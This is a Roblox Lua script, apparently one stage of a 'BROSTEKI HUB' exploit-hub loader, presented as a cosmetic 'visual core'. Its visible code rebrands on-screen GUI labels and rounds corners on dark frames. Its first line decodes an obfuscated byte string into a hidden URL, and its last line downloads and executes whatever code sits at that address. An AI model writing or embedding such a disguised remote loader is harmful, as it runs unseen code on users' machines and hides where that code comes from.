
--[[ STAGE 2: VISUAL CORE ]]
local KdxTsMetB1dL8BBX="\026\059\064\065\067\129\121\126\088\078\101\147\095\090\124\101\133\117\143\142\137\153\141\142\148\179\167\163\194\237\181\182\189\000\198\202\208\218\219\232\229\238\238\006\002\060\006\027\009\020\017\050\037\039\044\110\053\062\059\067\135\050\107\113\091\162\091\132\121\136\148\110\107\130\107\130\116\182\158\192\198\196\207\170\157\197\210\204\212\214\248\236\215\224\241\016\016\004\015\250\026\108\113\116\039\124\123\134\120\063\091\076"local YhRhG3loKWlGJo=203 local q2wkAuJXNmMMAJyJZ=106 local msxvRUHBuNxSSztM2fPrY=0 local ztSgM0_eW9JsY=5 local KK3BM13LU92j=8 local cCnuECPOHc23r7E9D1=false local _a5FrSL04CZaQHeWhUBN=bit32 and bit32.bxor if not _a5FrSL04CZaQHeWhUBN then _a5FrSL04CZaQHeWhUBN=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local OUkjXfgUjqvQCFIJFF39EW={}for t2MGgGZD9ieAARnubOvHhd=1,#KdxTsMetB1dL8BBX do local Mge_EVdaSqwGb5V=string.byte(KdxTsMetB1dL8BBX,t2MGgGZD9ieAARnubOvHhd)local PtOHZOs1gt07dIGIj2OmMZ=(q2wkAuJXNmMMAJyJZ+(t2MGgGZD9ieAARnubOvHhd*ztSgM0_eW9JsY)+KK3BM13LU92j)%256 if msxvRUHBuNxSSztM2fPrY==0 then Mge_EVdaSqwGb5V=(Mge_EVdaSqwGb5V-PtOHZOs1gt07dIGIj2OmMZ)%256 OUkjXfgUjqvQCFIJFF39EW[t2MGgGZD9ieAARnubOvHhd]=string.char(_a5FrSL04CZaQHeWhUBN(Mge_EVdaSqwGb5V,YhRhG3loKWlGJo))else Mge_EVdaSqwGb5V=_a5FrSL04CZaQHeWhUBN(Mge_EVdaSqwGb5V,YhRhG3loKWlGJo)OUkjXfgUjqvQCFIJFF39EW[t2MGgGZD9ieAARnubOvHhd]=string.char((Mge_EVdaSqwGb5V-PtOHZOs1gt07dIGIj2OmMZ)%256)end end local BJVYN5DrSimdgPpmoIw=table.concat(OUkjXfgUjqvQCFIJFF39EW)if cCnuECPOHc23r7E9D1 then BJVYN5DrSimdgPpmoIw=string.reverse(BJVYN5DrSimdgPpmoIw)end local HS_GhcQulpDOeUMSbOSVH_=BJVYN5DrSimdgPpmoIw
local HubName = "BROSTEKI HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(HS_GhcQulpDOeUMSbOSVH_))()
